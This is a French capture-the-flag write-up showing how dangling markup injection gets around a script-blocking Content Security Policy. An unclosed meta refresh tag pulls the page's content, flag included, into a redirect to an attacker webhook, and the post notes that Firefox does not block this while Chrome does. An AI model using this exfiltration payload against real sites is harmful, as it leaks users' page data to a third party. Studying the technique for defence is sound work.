---
layout: default
---

# CSP ultra-restrictive, et le navigateur dit "oui mais non"

## Le jour ou j'ai exfiltre un flag avec une balise des annees 90

Je regarde la CSP. Je la relis. Je la relis encore. `script-src 'none'`. Pas de `default-src`. Pas de `base-uri`. Pas de `form-action`. `img-src 'self'`. C'est-a-dire que le mec qui a configure ca, il s'est leve un matin en se disant "aujourd'hui, je vais construire un mur". Et en soi, le mur est pas mal. C'est un bon mur. Sauf qu'il a oublie la porte.

La comedie doit etre un genre serieusement fait, comme disait quelqu'un que j'estime beaucoup. Et bien la securite aussi. On ne fait pas les choses a moitie. Ou alors on assume qu'on les fait a moitie, et on arrete de bomber le torse avec sa Content Security Policy.

## Le contexte

Un scenario classique : une application web chez quack-corp.lab, un formulaire de contact, un bot qui consulte les pages soumises via `/report`. Le flag est quelque part dans le corps de la page, visible uniquement cote bot. Mon objectif est limpide : faire en sorte que le bot m'envoie le contenu de la page qu'il visite.

La page injecte mon entree directement dans le HTML :

```html
<h1>Welcome, MON_INPUT_ICI !</h1>
```

Injection HTML directe. Pas d'echappement. C'est Noel. Sauf que la CSP est la, bras croises, avec son air de videur de boite :

```
Content-Security-Policy: script-src 'none'; img-src 'self'
```

Pas de script, pas d'image externe, pas de cadre. Je ne peux rien executer, rien charger depuis l'exterieur. La situation est, disons, contraignante.

## La technique : dangling markup

Quand on ne peut pas executer de code, il reste le HTML lui-meme. Le navigateur est une machine a parser, et le parsing HTML a des comportements... disons *genereux* avec les attributs mal fermes.

Le principe du dangling markup : on ouvre un attribut HTML sans le fermer. Le parser, dans son infinie bonte, va tout avaler comme valeur de cet attribut jusqu'a trouver le caractere de fermeture correspondant. Tout. Y compris le flag qui traine dans la page.

Et pour naviguer quelque part avec ce contenu aspire ? `<meta http-equiv="refresh">`. La CSP ne bloque pas la navigation. Elle bloque les scripts, les images, les cadres. Mais un bon vieux meta refresh ? Ca passe. C'est 1995 qui revient en force.

## Premiere tentative : les guillemets doubles

Je commence logiquement avec des guillemets doubles. Mon injection :

```html
<meta http-equiv="refresh" content="0;url=https://webhook.quack-corp.lab/exfil?data=
```

L'idee : le `content` reste ouvert, le parser avale tout jusqu'au prochain `"` dans la page, et le bot est redirige vers mon webhook avec le contenu dans l'URL.

Je soumets. Je verifie mon webhook. Et la... le contenu s'arrete net. Le prochain guillemet double dans le HTML, c'est celui de `class="message"`, qui se trouve *avant* le flag.

```html
<h1>Welcome, <meta http-equiv="refresh" content="0;url=https://webhook.quack-corp.lab/exfil?data= !</h1>
<div class="message">
```

Le `"` de `class=` ferme mon attribut `content`. Je recupere `!</h1>\n<div `. Formidable. Merci. Tres utile.

J'ai rate, mais je ne veux pas qu'on dise que j'ai rien foutu, parce que c'est pas vrai.

## Deuxieme tentative : les guillemets simples

Je passe aux single quotes. La logique est la meme, mais cette fois le parser cherchera le prochain `'` au lieu du prochain `"`.

```html
<meta http-equiv="refresh" content='0;url=https://webhook.quack-corp.lab/exfil?data=
```

Je fais l'inventaire mental de la page. Ou se trouve le prochain `'` apres mon injection ? Je scrute le HTML source. Il y a un `:'(` -- un emoticone triste, un smiley de developpeur desabuse -- *apres* le flag. C'est mon homme.

Le parser va donc tout gober : le flag, les balises intermediaires, tout, jusqu'a l'apostrophe de ce smiley. Et tout ca finit dans l'URL de redirection.

Je soumets au bot via `/report`. J'attends. Rien sur le webhook.

## La fausse alerte du silence

Rien. Le neant. Je commence a douter. Est-ce que le bot est mort ? Est-ce que ma payload est mal formee ? Est-ce que j'ai vexe le serveur ?

Je reessaie. Toujours rien. Je verifie l'URL du webhook. Je verifie l'injection. Tout semble correct. Et puis je realise : c'etait un probleme de timing. Le bot a bien suivi la redirection, mon webhook a bien recu la requete, mais j'avais un souci cote reception. Classique. Le genre de truc qui vous fait perdre vingt minutes a debugger un probleme qui n'existe pas.

## Chrome vs Firefox, ou l'indice qui change tout

L'indice du challenge disait : "Attention, les navigateurs ont leur propre logique."

Et c'est la que ca devient interessant. Chrome, depuis quelques annees, a mis en place une mitigation specifique contre le dangling markup : il detecte la presence de `<` et de sauts de ligne dans les URLs generees par les meta refresh, et il les bloque. Purement et simplement. Chrome regarde l'URL, voit qu'elle contient du HTML, et dit "non merci, ca sent le piege".

Firefox ? Firefox s'en fiche. Firefox laisse passer. Firefox, c'est le chevalier qui garde le pont mais qui est parti chercher des champignons.

Le bot du challenge utilise Firefox. L'indice prend tout son sens. Si j'avais teste en local sur Chrome, j'aurais conclu que la technique ne marche pas. Mais le bot, lui, tourne sur Firefox, et Firefox suit le meta refresh sans broncher.

## La payload finale

```html
<meta http-equiv="refresh" content='0;url=https://webhook.quack-corp.lab/exfil?data=
```

Injectee dans la page, ca donne :

```html
<h1>Welcome, <meta http-equiv="refresh" content='0;url=https://webhook.quack-corp.lab/exfil?data= !</h1>
<!-- ... tout le contenu de la page, y compris le flag ... -->
<p>Sorry :'(</p>
```

Le parser lit tout depuis `data=` jusqu'au `'` de `:'(`. Le bot Firefox est redirige vers :

```
https://webhook.quack-corp.lab/exfil?data= !</h1>...[CONTENU DE LA PAGE]...[FLAG]...Sorry :
```

Et dans ce contenu, le flag : `D4NGL1NG_M4RKUP_W1TH_FIREF0X_EASY`.

Facile. Enfin, "facile" entre guillemets. Simples. Pas doubles.

## Ce qu'on retient

| Concept | Detail |
|---|---|
| **Dangling markup** | Technique d'exfiltration HTML sans JavaScript : on ouvre un attribut sans le fermer, le parser HTML inclut le contenu de la page dans la valeur de l'attribut |
| **Meta refresh et CSP** | `<meta http-equiv="refresh">` n'est bloque par aucune directive CSP standard. La navigation reste un angle mort |
| **Single vs double quotes** | Le choix du caractere de citation determine *ou* le parser arrete de lire. Il faut analyser le HTML cible pour choisir celui qui englobe le flag |
| **Chrome vs Firefox** | Chrome bloque les URLs meta refresh contenant `<` ou des retours a la ligne (mitigation dangling markup). Firefox ne le fait pas |
| **`script-src 'none'` ne suffit pas** | Une CSP qui bloque les scripts mais ignore la navigation reste vulnerable a l'exfiltration de contenu |
| **Directives manquantes** | L'absence de `navigate-to` (encore experimentale) ou de restrictions sur meta refresh laisse une porte ouverte |

## Outils utilises

- **Navigateur Firefox** -- pour tester la payload en conditions reelles (Chrome la bloque)
- **Webhook externe** (type webhook.site) -- pour recevoir les donnees exfiltrees via la redirection
- **Inspecteur HTML** -- pour analyser la structure de la page cible et reperer les caracteres de fermeture
- **Page `/report`** du challenge -- pour soumettre l'URL piege au bot

## References techniques

- [Dangling markup injection - PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
- [Dangling Markup - HTML scriptless injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
- [Evading CSP with DOM-based dangling markup - PortSwigger Research](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
- [Chrome dangling markup mitigation](https://www.bencteux.fr/posts/chrome_bypass_url_restrictions/)
